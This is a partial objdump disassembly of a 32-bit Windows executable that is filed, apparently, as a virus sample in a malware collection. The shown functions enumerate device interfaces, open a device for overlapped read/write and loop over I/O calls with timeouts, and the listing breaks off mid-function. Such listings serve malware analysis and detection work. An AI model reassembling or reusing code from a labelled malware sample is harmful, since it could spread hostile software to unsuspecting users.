
malware_samples/virus/3ae345e9c49727c2cd8063ecb23d2dbe5de4ae5edeb76a60e0ecb294fe00bfdf.exe:     file format pei-i386


Disassembly of section .text:

10001000 <.text>:
10001000:	b8 18 47 01 10       	mov    $0x10014718,%eax
10001005:	c3                   	ret
10001006:	cc                   	int3
10001007:	cc                   	int3
10001008:	cc                   	int3
10001009:	cc                   	int3
1000100a:	cc                   	int3
1000100b:	cc                   	int3
1000100c:	cc                   	int3
1000100d:	cc                   	int3
1000100e:	cc                   	int3
1000100f:	cc                   	int3
10001010:	55                   	push   %ebp
10001011:	8b ec                	mov    %esp,%ebp
10001013:	81 ec 40 01 00 00    	sub    $0x140,%esp
10001019:	a1 04 30 01 10       	mov    0x10013004,%eax
1000101e:	33 c5                	xor    %ebp,%eax
10001020:	89 45 fc             	mov    %eax,-0x4(%ebp)
10001023:	8b 45 0c             	mov    0xc(%ebp),%eax
10001026:	53                   	push   %ebx
10001027:	8b 5d 08             	mov    0x8(%ebp),%ebx
1000102a:	56                   	push   %esi
1000102b:	57                   	push   %edi
1000102c:	68 04 01 00 00       	push   $0x104
10001031:	a3 80 3c 01 10       	mov    %eax,0x10013c80
10001036:	8d 85 f8 fe ff ff    	lea    -0x108(%ebp),%eax
1000103c:	6a 00                	push   $0x0
1000103e:	50                   	push   %eax
1000103f:	89 9d c0 fe ff ff    	mov    %ebx,-0x140(%ebp)
10001045:	e8 06 1d 00 00       	call   0x10002d50
1000104a:	83 c4 0c             	add    $0xc,%esp
1000104d:	6a 12                	push   $0x12
1000104f:	6a 00                	push   $0x0
10001051:	6a 00                	push   $0x0
10001053:	68 9c 1c 01 10       	push   $0x10011c9c
10001058:	ff 15 24 d1 00 10    	call   *0x1000d124
1000105e:	8b f0                	mov    %eax,%esi
10001060:	83 fe ff             	cmp    $0xffffffff,%esi
10001063:	0f 84 98 00 00 00    	je     0x10001101
10001069:	8d 85 d0 fe ff ff    	lea    -0x130(%ebp),%eax
1000106f:	c7 85 d0 fe ff ff 1c 	movl   $0x1c,-0x130(%ebp)
10001076:	00 00 00 
10001079:	50                   	push   %eax
1000107a:	53                   	push   %ebx
1000107b:	68 9c 1c 01 10       	push   $0x10011c9c
10001080:	6a 00                	push   $0x0
10001082:	56                   	push   %esi
10001083:	ff 15 1c d1 00 10    	call   *0x1000d11c
10001089:	85 c0                	test   %eax,%eax
1000108b:	74 6d                	je     0x100010fa
1000108d:	8b 1d 28 d1 00 10    	mov    0x1000d128,%ebx
10001093:	8d 85 c8 fe ff ff    	lea    -0x138(%ebp),%eax
10001099:	6a 00                	push   $0x0
1000109b:	50                   	push   %eax
1000109c:	6a 00                	push   $0x0
1000109e:	6a 00                	push   $0x0
100010a0:	8d 85 d0 fe ff ff    	lea    -0x130(%ebp),%eax
100010a6:	c7 85 c8 fe ff ff 00 	movl   $0x0,-0x138(%ebp)
100010ad:	00 00 00 
100010b0:	50                   	push   %eax
100010b1:	56                   	push   %esi
100010b2:	ff d3                	call   *%ebx
100010b4:	8b 85 c8 fe ff ff    	mov    -0x138(%ebp),%eax
100010ba:	83 c0 20             	add    $0x20,%eax
100010bd:	50                   	push   %eax
100010be:	89 85 c8 fe ff ff    	mov    %eax,-0x138(%ebp)
100010c4:	e8 06 34 00 00       	call   0x100044cf
100010c9:	8b f8                	mov    %eax,%edi
100010cb:	83 c4 04             	add    $0x4,%esp
100010ce:	85 ff                	test   %edi,%edi
100010d0:	74 28                	je     0x100010fa
100010d2:	6a 00                	push   $0x0
100010d4:	6a 00                	push   $0x0
100010d6:	ff b5 c8 fe ff ff    	push   -0x138(%ebp)
100010dc:	8d 85 d0 fe ff ff    	lea    -0x130(%ebp),%eax
100010e2:	c7 07 05 00 00 00    	movl   $0x5,(%edi)
100010e8:	57                   	push   %edi
100010e9:	50                   	push   %eax
100010ea:	56                   	push   %esi
100010eb:	ff d3                	call   *%ebx
100010ed:	85 c0                	test   %eax,%eax
100010ef:	75 24                	jne    0x10001115
100010f1:	57                   	push   %edi
100010f2:	e8 bd 33 00 00       	call   0x100044b4
100010f7:	83 c4 04             	add    $0x4,%esp
100010fa:	56                   	push   %esi
100010fb:	ff 15 34 d1 00 10    	call   *0x1000d134
10001101:	5f                   	pop    %edi
10001102:	5e                   	pop    %esi
10001103:	83 c8 ff             	or     $0xffffffff,%eax
10001106:	5b                   	pop    %ebx
10001107:	8b 4d fc             	mov    -0x4(%ebp),%ecx
1000110a:	33 cd                	xor    %ebp,%ecx
1000110c:	e8 78 0b 00 00       	call   0x10001c89
10001111:	8b e5                	mov    %ebp,%esp
10001113:	5d                   	pop    %ebp
10001114:	c3                   	ret
10001115:	68 04 01 00 00       	push   $0x104
1000111a:	8d 47 04             	lea    0x4(%edi),%eax
1000111d:	50                   	push   %eax
1000111e:	8d 85 f8 fe ff ff    	lea    -0x108(%ebp),%eax
10001124:	50                   	push   %eax
10001125:	e8 66 32 00 00       	call   0x10004390
1000112a:	57                   	push   %edi
1000112b:	e8 84 33 00 00       	call   0x100044b4
10001130:	83 c4 10             	add    $0x10,%esp
10001133:	56                   	push   %esi
10001134:	ff 15 34 d1 00 10    	call   *0x1000d134
1000113a:	6a 00                	push   $0x0
1000113c:	68 80 00 00 40       	push   $0x40000080
10001141:	6a 03                	push   $0x3
10001143:	6a 00                	push   $0x0
10001145:	6a 03                	push   $0x3
10001147:	68 00 00 00 c0       	push   $0xc0000000
1000114c:	8d 85 f8 fe ff ff    	lea    -0x108(%ebp),%eax
10001152:	50                   	push   %eax
10001153:	ff 15 44 d0 00 10    	call   *0x1000d044
10001159:	8b d8                	mov    %eax,%ebx
1000115b:	8d 85 c8 fe ff ff    	lea    -0x138(%ebp),%eax
10001161:	50                   	push   %eax
10001162:	53                   	push   %ebx
10001163:	ff 15 44 d1 00 10    	call   *0x1000d144
10001169:	85 c0                	test   %eax,%eax
1000116b:	74 94                	je     0x10001101
1000116d:	8b 8d c8 fe ff ff    	mov    -0x138(%ebp),%ecx
10001173:	8d 85 cf fe ff ff    	lea    -0x131(%ebp),%eax
10001179:	50                   	push   %eax
1000117a:	8d 85 c4 fe ff ff    	lea    -0x13c(%ebp),%eax
10001180:	89 0d 70 47 01 10    	mov    %ecx,0x10014770
10001186:	50                   	push   %eax
10001187:	6a 01                	push   $0x1
10001189:	51                   	push   %ecx
1000118a:	c7 85 c4 fe ff ff 01 	movl   $0x1,-0x13c(%ebp)
10001191:	00 00 00 
10001194:	ff 15 48 d1 00 10    	call   *0x1000d148
1000119a:	85 c0                	test   %eax,%eax
1000119c:	0f 84 5f ff ff ff    	je     0x10001101
100011a2:	8a 85 cf fe ff ff    	mov    -0x131(%ebp),%al
100011a8:	a2 74 47 01 10       	mov    %al,0x10014774
100011ad:	8d 85 ec fe ff ff    	lea    -0x114(%ebp),%eax
100011b3:	50                   	push   %eax
100011b4:	6a 00                	push   $0x0
100011b6:	ff 35 70 47 01 10    	push   0x10014770
100011bc:	ff 15 3c d1 00 10    	call   *0x1000d13c
100011c2:	85 c0                	test   %eax,%eax
100011c4:	0f 84 37 ff ff ff    	je     0x10001101
100011ca:	33 f6                	xor    %esi,%esi
100011cc:	80 bd f0 fe ff ff 00 	cmpb   $0x0,-0x110(%ebp)
100011d3:	76 6c                	jbe    0x10001241
100011d5:	8b 3d 54 d1 00 10    	mov    0x1000d154,%edi
100011db:	0f 1f 44 00 00       	nopl   0x0(%eax,%eax,1)
100011e0:	68 4c 47 01 10       	push   $0x1001474c
100011e5:	56                   	push   %esi
100011e6:	6a 00                	push   $0x0
100011e8:	ff 35 70 47 01 10    	push   0x10014770
100011ee:	ff d7                	call   *%edi
100011f0:	8b 0d 4c 47 01 10    	mov    0x1001474c,%ecx
100011f6:	8b d0                	mov    %eax,%edx
100011f8:	83 f9 02             	cmp    $0x2,%ecx
100011fb:	75 1a                	jne    0x10001217
100011fd:	8a 0d 50 47 01 10    	mov    0x10014750,%cl
10001203:	84 c9                	test   %cl,%cl
10001205:	79 08                	jns    0x1000120f
10001207:	88 0d 75 47 01 10    	mov    %cl,0x10014775
1000120d:	eb 1e                	jmp    0x1000122d
1000120f:	88 0d 76 47 01 10    	mov    %cl,0x10014776
10001215:	eb 16                	jmp    0x1000122d
10001217:	83 f9 03             	cmp    $0x3,%ecx
1000121a:	0f 85 e1 fe ff ff    	jne    0x10001101
10001220:	0f b6 05 50 47 01 10 	movzbl 0x10014750,%eax
10001227:	66 a3 78 47 01 10    	mov    %ax,0x10014778
1000122d:	0f b6 85 f0 fe ff ff 	movzbl -0x110(%ebp),%eax
10001234:	46                   	inc    %esi
10001235:	3b f0                	cmp    %eax,%esi
10001237:	7c a7                	jl     0x100011e0
10001239:	85 d2                	test   %edx,%edx
1000123b:	0f 84 c0 fe ff ff    	je     0x10001101
10001241:	8b 85 c0 fe ff ff    	mov    -0x140(%ebp),%eax
10001247:	8b 4d fc             	mov    -0x4(%ebp),%ecx
1000124a:	5f                   	pop    %edi
1000124b:	5e                   	pop    %esi
1000124c:	89 1c 85 80 3a 01 10 	mov    %ebx,0x10013a80(,%eax,4)
10001253:	33 cd                	xor    %ebp,%ecx
10001255:	b8 70 47 01 10       	mov    $0x10014770,%eax
1000125a:	5b                   	pop    %ebx
1000125b:	e8 29 0a 00 00       	call   0x10001c89
10001260:	8b e5                	mov    %ebp,%esp
10001262:	5d                   	pop    %ebp
10001263:	c3                   	ret
10001264:	cc                   	int3
10001265:	cc                   	int3
10001266:	cc                   	int3
10001267:	cc                   	int3
10001268:	cc                   	int3
10001269:	cc                   	int3
1000126a:	cc                   	int3
1000126b:	cc                   	int3
1000126c:	cc                   	int3
1000126d:	cc                   	int3
1000126e:	cc                   	int3
1000126f:	cc                   	int3
10001270:	55                   	push   %ebp
10001271:	8b ec                	mov    %esp,%ebp
10001273:	51                   	push   %ecx
10001274:	83 3d 80 3c 01 10 00 	cmpl   $0x0,0x10013c80
1000127b:	53                   	push   %ebx
1000127c:	56                   	push   %esi
1000127d:	57                   	push   %edi
1000127e:	89 55 fc             	mov    %edx,-0x4(%ebp)
10001281:	8b d9                	mov    %ecx,%ebx
10001283:	bf 01 00 00 00       	mov    $0x1,%edi
10001288:	0f 84 c4 00 00 00    	je     0x10001352
1000128e:	8b 75 0c             	mov    0xc(%ebp),%esi
10001291:	39 3d 7c 47 01 10    	cmp    %edi,0x1001477c
10001297:	75 1c                	jne    0x100012b5
10001299:	0f b6 43 06          	movzbl 0x6(%ebx),%eax
1000129d:	68 38 47 01 10       	push   $0x10014738
100012a2:	56                   	push   %esi
100012a3:	ff 75 08             	push   0x8(%ebp)
100012a6:	89 5d fc             	mov    %ebx,-0x4(%ebp)
100012a9:	52                   	push   %edx
100012aa:	50                   	push   %eax
100012ab:	ff 33                	push   (%ebx)
100012ad:	ff 15 40 d1 00 10    	call   *0x1000d140
100012b3:	eb 06                	jmp    0x100012bb
100012b5:	8b 45 fc             	mov    -0x4(%ebp),%eax
100012b8:	89 45 fc             	mov    %eax,-0x4(%ebp)
100012bb:	ff 15 40 d0 00 10    	call   *0x1000d040
100012c1:	3d e5 03 00 00       	cmp    $0x3e5,%eax
100012c6:	74 1d                	je     0x100012e5
100012c8:	ff 15 40 d0 00 10    	call   *0x1000d040
100012ce:	85 c0                	test   %eax,%eax
100012d0:	75 0f                	jne    0x100012e1
100012d2:	8b 4d 08             	mov    0x8(%ebp),%ecx
100012d5:	39 0e                	cmp    %ecx,(%esi)
100012d7:	5f                   	pop    %edi
100012d8:	5e                   	pop    %esi
100012d9:	0f 94 c0             	sete   %al
100012dc:	5b                   	pop    %ebx
100012dd:	8b e5                	mov    %ebp,%esp
100012df:	5d                   	pop    %ebp
100012e0:	c3                   	ret
100012e1:	33 f6                	xor    %esi,%esi
100012e3:	eb 1a                	jmp    0x100012ff
100012e5:	68 10 27 00 00       	push   $0x2710
100012ea:	ff 35 84 3c 01 10    	push   0x10013c84
100012f0:	ff 15 38 d0 00 10    	call   *0x1000d038
100012f6:	33 c9                	xor    %ecx,%ecx
100012f8:	8b f7                	mov    %edi,%esi
100012fa:	85 c0                	test   %eax,%eax
100012fc:	0f 45 f1             	cmovne %ecx,%esi
100012ff:	6a 00                	push   $0x0
10001301:	ff 75 0c             	push   0xc(%ebp)
10001304:	68 38 47 01 10       	push   $0x10014738
10001309:	39 3d 7c 47 01 10    	cmp    %edi,0x1001477c
1000130f:	75 32                	jne    0x10001343
10001311:	8b 45 fc             	mov    -0x4(%ebp),%eax
10001314:	ff 30                	push   (%eax)
10001316:	ff 15 4c d0 00 10    	call   *0x1000d04c
1000131c:	85 c0                	test   %eax,%eax
1000131e:	75 02                	jne    0x10001322
10001320:	33 f6                	xor    %esi,%esi
10001322:	85 f6                	test   %esi,%esi
10001324:	75 07                	jne    0x1000132d
10001326:	53                   	push   %ebx
10001327:	ff 15 34 d0 00 10    	call   *0x1000d034
1000132d:	8b 45 0c             	mov    0xc(%ebp),%eax
10001330:	33 ff                	xor    %edi,%edi
10001332:	8b 4d 08             	mov    0x8(%ebp),%ecx
10001335:	39 08                	cmp    %ecx,(%eax)
10001337:	0f 44 fe             	cmove  %esi,%edi
1000133a:	8b c7                	mov    %edi,%eax
1000133c:	5f                   	pop    %edi
1000133d:	5e                   	pop    %esi
1000133e:	5b                   	pop    %ebx
1000133f:	8b e5                	mov    %ebp,%esp
10001341:	5d                   	pop    %ebp
10001342:	c3                   	ret
10001343:	53                   	push   %ebx
10001344:	ff 15 4c d0 00 10    	call   *0x1000d04c
1000134a:	85 c0                	test   %eax,%eax
1000134c:	75 d4                	jne    0x10001322
1000134e:	33 f6                	xor    %esi,%esi
10001350:	eb d4                	jmp    0x10001326
10001352:	33 f6                	xor    %esi,%esi
10001354:	39 3d 7c 47 01 10    	cmp    %edi,0x1001477c
1000135a:	75 30                	jne    0x1000138c
1000135c:	8b 4d 08             	mov    0x8(%ebp),%ecx
1000135f:	8b 45 0c             	mov    0xc(%ebp),%eax
10001362:	6a 00                	push   $0x0
10001364:	50                   	push   %eax
10001365:	51                   	push   %ecx
10001366:	8d 04 16             	lea    (%esi,%edx,1),%eax
10001369:	50                   	push   %eax
1000136a:	0f b6 43 06          	movzbl 0x6(%ebx),%eax
1000136e:	50                   	push   %eax
1000136f:	ff 33                	push   (%ebx)
10001371:	ff 15 40 d1 00 10    	call   *0x1000d140
10001377:	8b f8                	mov    %eax,%edi
10001379:	85 ff                	test   %edi,%edi
1000137b:	74 0f                	je     0x1000138c
1000137d:	8b 45 0c             	mov    0xc(%ebp),%eax
10001380:	8b 4d 08             	mov    0x8(%ebp),%ecx
10001383:	8b 55 fc             	mov    -0x4(%ebp),%edx
10001386:	03 30                	add    (%eax),%esi
10001388:	3b f1                	cmp    %ecx,%esi
1000138a:	72 d6                	jb     0x10001362
1000138c:	8b c7                	mov    %edi,%eax
1000138e:	5f                   	pop    %edi
1000138f:	5e                   	pop    %esi
10001390:	5b                   	pop    %ebx
10001391:	8b e5                	mov    %ebp,%esp
10001393:	5d                   	pop    %ebp
10001394:	c3                   	ret
10001395:	cc                   	int3
10001396:	cc                   	int3
10001397:	cc                   	int3
10001398:	cc                   	int3
10001399:	cc                   	int3
1000139a:	cc                   	int3
1000139b:	cc                   	int3
1000139c:	cc                   	int3
1000139d:	cc                   	int3
1000139e:	cc                   	int3
1000139f:	cc                   	int3
100013a0:	55                   	push   %ebp
100013a1:	8b ec                	mov    %esp,%ebp
100013a3:	51                   	push   %ecx
100013a4:	83 3d 80 3c 01 10 00 	cmpl   $0x0,0x10013c80
100013ab:	53                   	push   %ebx
100013ac:	56                   	push   %esi
100013ad:	57                   	push   %edi
100013ae:	be 01 00 00 00       	mov    $0x1,%esi
100013b3:	0f 84 c9 00 00 00    	je     0x10001482
100013b9:	8b 7d 14             	mov    0x14(%ebp),%edi
100013bc:	8b 5d 08             	mov    0x8(%ebp),%ebx
100013bf:	39 35 7c 47 01 10    	cmp    %esi,0x1001477c
100013c5:	75 1e                	jne    0x100013e5
100013c7:	0f b6 43 05          	movzbl 0x5(%ebx),%eax
100013cb:	68 5c 47 01 10       	push   $0x1001475c
100013d0:	57                   	push   %edi
100013d1:	ff 75 10             	push   0x10(%ebp)
100013d4:	89 5d fc             	mov    %ebx,-0x4(%ebp)
100013d7:	ff 75 0c             	push   0xc(%ebp)
100013da:	50                   	push   %eax
100013db:	ff 33                	push   (%ebx)
100013dd:	ff 15 50 d1 00 10    	call   *0x1000d150
100013e3:	eb 06                	jmp    0x100013eb
100013e5:	8b 45 fc             	mov    -0x4(%ebp),%eax
100013e8:	89 45 fc             	mov    %eax,-0x4(%ebp)
100013eb:	ff 15 40 d0 00 10    	call   *0x1000d040
100013f1:	3d e5 03 00 00       	cmp    $0x3e5,%eax
100013f6:	74 2a                	je     0x10001422
100013f8:	ff 15 40 d0 00 10    	call   *0x1000d040
100013fe:	85 c0                	test   %eax,%eax
10001400:	75 1c                	jne    0x1000141e
10001402:	8b 07                	mov    (%edi),%eax
10001404:	85 c0                	test   %eax,%eax
10001406:	0f 84 af 00 00 00    	je     0x100014bb
1000140c:	3b 45 10             	cmp    0x10(%ebp),%eax
1000140f:	0f 84 a6 00 00 00    	je     0x100014bb
10001415:	5f                   	pop    %edi
10001416:	5e                   	pop    %esi
10001417:	33 c0                	xor    %eax,%eax
10001419:	5b                   	pop    %ebx
1000141a:	8b e5                	mov    %ebp,%esp
1000141c:	5d                   	pop    %ebp
1000141d:	c3                   	ret
1000141e:	33 f6                	xor    %esi,%esi
10001420:	eb 18                	jmp    0x1000143a
10001422:	68 10 27 00 00       	push   $0x2710
10001427:	ff 35 88 3c 01 10    	push   0x10013c88
1000142d:	ff 15 38 d0 00 10    	call   *0x1000d038
10001433:	33 c9                	xor    %ecx,%ecx
10001435:	85 c0                	test   %eax,%eax
10001437:	0f 45 f1             	cmovne %ecx,%esi
1000143a:	83 3d 7c 47 01 10 01 	cmpl   $0x1,0x1001477c
10001441:	6a 00                	push   $0x0
10001443:	57                   	push   %edi
10001444:	68 5c 47 01 10       	push   $0x1001475c
10001449:	75 13                	jne    0x1000145e
1000144b:	8b 45 fc             	mov    -0x4(%ebp),%eax
1000144e:	ff 30                	push   (%eax)
10001450:	ff 15 4c d0 00 10    	call   *0x1000d04c
10001456:	85 c0                	test   %eax,%eax
10001458:	75 07                	jne    0x10001461
1000145a:	33 f6                	xor    %esi,%esi
1000145c:	eb 07                	jmp    0x10001465
1000145e:	53                   	push   %ebx
1000145f:	eb ef                	jmp    0x10001450
10001461:	85 f6                	test   %esi,%esi
10001463:	75 07                	jne    0x1000146c
10001465:	53                   	push   %ebx
10001466:	ff 15 34 d0 00 10    	call   *0x1000d034
1000146c:	8b 07                	mov    (%edi),%eax
1000146e:	85 c0                	test   %eax,%eax
10001470:	74 49                	je     0x100014bb
10001472:	3b 45 10             	cmp    0x10(%ebp),%eax
10001475:	74 44                	je     0x100014bb
10001477:	33 f6                	xor    %esi,%esi
10001479:	5f                   	pop    %edi
1000147a:	8b c6                	mov    %esi,%eax
1000147c:	5e                   	pop    %esi
1000147d:	5b                   	pop    %ebx
1000147e:	8b e5                	mov    %ebp,%esp
10001480:	5d                   	pop    %ebp
10001481:	c3                   	ret
10001482:	33 ff                	xor    %edi,%edi
10001484:	39 35 7c 47 01 10    	cmp    %esi,0x1001477c
1000148a:	75 2f                	jne    0x100014bb
1000148c:	8b 5d 14             	mov    0x14(%ebp),%ebx
1000148f:	8b 45 10             	mov    0x10(%ebp),%eax
10001492:	8b 4d 08             	mov    0x8(%ebp),%ecx
10001495:	6a 00                	push   $0x0
10001497:	53                   	push   %ebx
10001498:	50                   	push   %eax
10001499:	8b 45 0c             	mov    0xc(%ebp),%eax
1000149c:	03 c7                	add    %edi,%eax
1000149e:	50                   	push   %eax
1000149f:	0f b6 41 05          	movzbl 0x5(%ecx),%eax
100014a3:	50                   	push   %eax
100014a4:	ff 31                	push   (%ecx)
100014a6:	ff 15 50 d1 00 10    	call   *0x1000d150
100014ac:	8b f0                	mov    %eax,%esi
100014ae:	85 f6                	test   %esi,%esi
100014b0:	74 09                	je     0x100014bb
100014b2:	03 3b                	add    (%ebx),%edi
100014b4:	8b 45 10             	mov    0x10(%ebp),%eax
100014b7:	3b f8                	cmp    %eax,%edi
100014b9:	72 d7                	jb     0x10001492
100014bb:	5f                   	pop    %edi
100014bc:	8b c6                	mov    %esi,%eax
100014be:	5e                   	pop    %esi
100014bf:	5b                   	pop    %ebx
100014c0:	8b e5                	mov    %ebp,%esp
100014c2:	5d                   	pop    %ebp
100014c3:	c3                   	ret
100014c4:	cc                   	int3
100014c5:	cc                   	int3
100014c6:	cc                   	int3
100014c7:	cc                   	int3
100014c8:	cc                   	int3
100014c9:	cc                   	int3
100014ca:	cc                   	int3
100014cb:	cc                   	int3
100014cc:	cc                   	int3
100014cd:	cc                   	int3
100014ce:	cc                   	int3
100014cf:	cc                   	int3
100014d0:	55                   	push   %ebp
100014d1:	8b ec                	mov    %esp,%ebp
100014d3:	51                   	push   %ecx
100014d4:	83 3d 80 3c 01 10 00 	cmpl   $0x0,0x10013c80
100014db:	53                   	push   %ebx
100014dc:	56                   	push   %esi
100014dd:	57                   	push   %edi
100014de:	bf 01 00 00 00       	mov    $0x1,%edi
100014e3:	0f 84 c8 00 00 00    	je     0x100015b1
100014e9:	8b 5d 14             	mov    0x14(%ebp),%ebx
100014ec:	8b 75 10             	mov    0x10(%ebp),%esi
100014ef:	39 3d 7c 47 01 10    	cmp    %edi,0x1001477c
100014f5:	75 1f                	jne    0x10001516
100014f7:	8b 4d 08             	mov    0x8(%ebp),%ecx
100014fa:	68 38 47 01 10       	push   $0x10014738
100014ff:	53                   	push   %ebx
10001500:	56                   	push   %esi
10001501:	ff 75 0c             	push   0xc(%ebp)
10001504:	0f b6 41 06          	movzbl 0x6(%ecx),%eax
10001508:	50                   	push   %eax
10001509:	ff 31                	push   (%ecx)
1000150b:	89 4d fc             	mov    %ecx,-0x4(%ebp)
1000150e:	ff 15 40 d1 00 10    	call   *0x1000d140
10001514:	eb 06                	jmp    0x1000151c
10001516:	8b 45 fc             	mov    -0x4(%ebp),%eax
10001519:	89 45 fc             	mov    %eax,-0x4(%ebp)
1000151c:	ff 15 40 d0 00 10    	call   *0x1000d040
10001522:	3d e5 03 00 00       	cmp    $0x3e5,%eax
10001527:	74 1a                	je     0x10001543
10001529:	ff 15 40 d0 00 10    	call   *0x1000d040
1000152f:	85 c0                	test   %eax,%eax
10001531:	75 0c                	jne    0x1000153f
10001533:	39 33                	cmp    %esi,(%ebx)
10001535:	5f                   	pop    %edi
10001536:	5e                   	pop    %esi
10001537:	0f 94 c0             	sete   %al
1000153a:	5b                   	pop    %ebx
1000153b:	8b e5                	mov    %ebp,%esp
1000153d:	5d                   	pop    %ebp
1000153e:	c3                   	ret
1000153f:	33 f6                	xor    %esi,%esi
10001541:	eb 1a                	jmp    0x1000155d
10001543:	68 10 27 00 00       	push   $0x2710
10001548:	ff 35 84 3c 01 10    	push   0x10013c84
1000154e:	ff 15 38 d0 00 10    	call   *0x1000d038
10001554:	33 c9                	xor    %ecx,%ecx
10001556:	8b f7                	mov    %edi,%esi
10001558:	85 c0                	test   %eax,%eax
1000155a:	0f 45 f1             	cmovne %ecx,%esi
1000155d:	6a 00                	push   $0x0
1000155f:	53                   	push   %ebx
10001560:	68 38 47 01 10       	push   $0x10014738
10001565:	39 3d 7c 47 01 10    	cmp    %edi,0x1001477c
1000156b:	75 32                	jne    0x1000159f
1000156d:	8b 45 fc             	mov    -0x4(%ebp),%eax
10001570:	ff 30                	push   (%eax)
10001572:	ff 15 4c d0 00 10    	call   *0x1000d04c
10001578:	8b 7d 08             	mov    0x8(%ebp),%edi
1000157b:	85 c0                	test   %eax,%eax
1000157d:	75 02                	jne    0x10001581
1000157f:	33 f6                	xor    %esi,%esi
10001581:	85 f6                	test   %esi,%esi
10001583:	75 07                	jne    0x1000158c
10001585:	57                   	push   %edi
10001586:	ff 15 34 d0 00 10    	call   *0x1000d034
1000158c:	8b 45 10             	mov    0x10(%ebp),%eax
1000158f:	33 ff                	xor    %edi,%edi
10001591:	39 03                	cmp    %eax,(%ebx)
10001593:	0f 44 fe             	cmove  %esi,%edi
10001596:	8b c7                	mov    %edi,%eax
10001598:	5f                   	pop    %edi
10001599:	5e                   	pop    %esi
1000159a:	5b                   	pop    %ebx
1000159b:	8b e5                	mov    %ebp,%esp
1000159d:	5d                   	pop    %ebp
1000159e:	c3                   	ret
1000159f:	8b 7d 08             	mov    0x8(%ebp),%edi
100015a2:	57                   	push   %edi
100015a3:	ff 15 4c d0 00 10    	call   *0x1000d04c
100015a9:	85 c0                	test   %eax,%eax
100015ab:	75 d4                	jne    0x10001581
100015ad:	33 f6                	xor    %esi,%esi
100015af:	eb d4                	jmp    0x10001585
100015b1:	33 f6                	xor    %esi,%esi
100015b3:	39 3d 7c 47 01 10    	cmp    %edi,0x1001477c
100015b9:	75 2f                	jne    0x100015ea
100015bb:	8b 5d 14             	mov    0x14(%ebp),%ebx
100015be:	8b 45 10             	mov    0x10(%ebp),%eax
100015c1:	8b 4d 08             	mov    0x8(%ebp),%ecx
100015c4:	6a 00                	push   $0x0
100015c6:	53                   	push   %ebx
100015c7:	50                   	push   %eax
100015c8:	8b 45 0c             	mov    0xc(%ebp),%eax
100015cb:	03 c6                	add    %esi,%eax
100015cd:	50                   	push   %eax
100015ce:	0f b6 41 06          	movzbl 0x6(%ecx),%eax
100015d2:	50                   	push   %eax
100015d3:	ff 31                	push   (%ecx)
100015d5:	ff 15 40 d1 00 10    	call   *0x1000d140
100015db:	8b f8                	mov    %eax,%edi
100015dd:	85 ff                	test   %edi,%edi
100015df:	74 09                	je     0x100015ea
100015e1:	03 33                	add    (%ebx),%esi
100015e3:	8b 45 10             	mov    0x10(%ebp),%eax
100015e6:	3b f0                	cmp    %eax,%esi
100015e8:	72 d7                	jb     0x100015c1
100015ea:	8b c7                	mov    %edi,%eax
100015ec:	5f                   	pop    %edi
100015ed:	5e                   	pop    %esi
100015ee:	5b                   	pop    %ebx
100015ef:	8b e5                	mov    %ebp,%esp
100015f1:	5d                   	pop    %ebp
100015f2:	c3                   	ret
100015f3:	cc                   	int3
100015f4:	cc                   	int3
100015f5:	cc                   	int3
100015f6:	cc                   	int3
100015f7:	cc                   	int3
100015f8:	cc                   	int3
100015f9:	cc                   	int3
100015fa:	cc                   	int3
100015fb:	cc                   	int3
100015fc:	cc                   	int3
100015fd:	cc                   	int3
100015fe:	cc                   	int3
100015ff:	cc                   	int3
10001600:	55                   	push   %ebp
10001601:	8b ec                	mov    %esp,%ebp
10001603:	81 ec 28 01 00 00    	sub    $0x128,%esp
10001609:	a1 04 30 01 10       	mov    0x10013004,%eax
1000160e:	33 c5                	xor    %ebp,%eax
10001610:	89 45 fc             	mov    %eax,-0x4(%ebp)
10001613:	56                   	push   %esi
10001614:	6a 12                	push   $0x12
10001616:	6a 00                	push   $0x0
10001618:	6a 00                	push   $0x0
1000161a:	68 9c 1c 01 10       	push   $0x10011c9c
1000161f:	ff 15 24 d1 00 10    	call   *0x1000d124
10001625:	8b f0                	mov    %eax,%esi
10001627:	83 fe ff             	cmp    $0xffffffff,%esi
1000162a:	75 11                	jne    0x1000163d
1000162c:	0b c0                	or     %eax,%eax
1000162e:	5e                   	pop    %esi
1000162f:	8b 4d fc             	mov    -0x4(%ebp),%ecx
10001632:	33 cd                	xor    %ebp,%ecx
10001634:	e8 50 06 00 00       	call   0x10001c89
10001639:	8b e5                	mov    %ebp,%esp
1000163b:	5d                   	pop    %ebp
1000163c:	c3                   	ret
1000163d:	53                   	push   %ebx
1000163e:	57                   	push   %edi
1000163f:	8d 85 dc fe ff ff    	lea    -0x124(%ebp),%eax
10001645:	c7 85 dc fe ff ff 1c 	movl   $0x1c,-0x124(%ebp)
1000164c:	00 00 00 
1000164f:	50                   	push   %eax
10001650:	33 db                	xor    %ebx,%ebx
10001652:	53                   	push   %ebx
10001653:	68 9c 1c 01 10       	push   $0x10011c9c
10001658:	53                   	push   %ebx
10001659:	56                   	push   %esi
1000165a:	ff 15 1c d1 00 10    	call   *0x1000d11c
10001660:	85 c0                	test   %eax,%eax
10001662:	0f 84 b1 00 00 00    	je     0x10001719
10001668:	6a 00                	push   $0x0
1000166a:	8d 85 d8 fe ff ff    	lea    -0x128(%ebp),%eax
10001670:	c7 85 d8 fe ff ff 00 	movl   $0x0,-0x128(%ebp)
10001677:	00 00 00 
1000167a:	50                   	push   %eax
1000167b:	6a 00                	push   $0x0
1000167d:	6a 00                	push   $0x0
1000167f:	8d 85 dc fe ff ff    	lea    -0x124(%ebp),%eax
10001685:	50                   	push   %eax
10001686:	56                   	push   %esi
10001687:	ff 15 28 d1 00 10    	call   *0x1000d128
1000168d:	8b 85 d8 fe ff ff    	mov    -0x128(%ebp),%eax
10001693:	83 c0 20             	add    $0x20,%eax
10001696:	50                   	push   %eax
10001697:	89 85 d8 fe ff ff    	mov    %eax,-0x128(%ebp)
1000169d:	e8 2d 2e 00 00       	call   0x100044cf
100016a2:	8b f8                	mov    %eax,%edi
100016a4:	83 c4 04             	add    $0x4,%esp
100016a7:	85 ff                	test   %edi,%edi
100016a9:	0f 84 9a 00 00 00    	je     0x10001749
100016af:	6a 00                	push   $0x0
100016b1:	6a 00                	push   $0x0
100016b3:	c7 07 05 00 00 00    	movl   $0x5,(%edi)
100016b9:	8d 85 dc fe ff ff    	lea    -0x124(%ebp),%eax
100016bf:	ff b5 d8 fe ff ff    	push   -0x128(%ebp)
100016c5:	57                   	push   %edi
100016c6:	50                   	push   %eax
100016c7:	56                   	push   %esi
100016c8:	ff 15 28 d1 00 10    	call   *0x1000d128
100016ce:	85 c0                	test   %eax,%eax
100016d0:	74 6e                	je     0x10001740
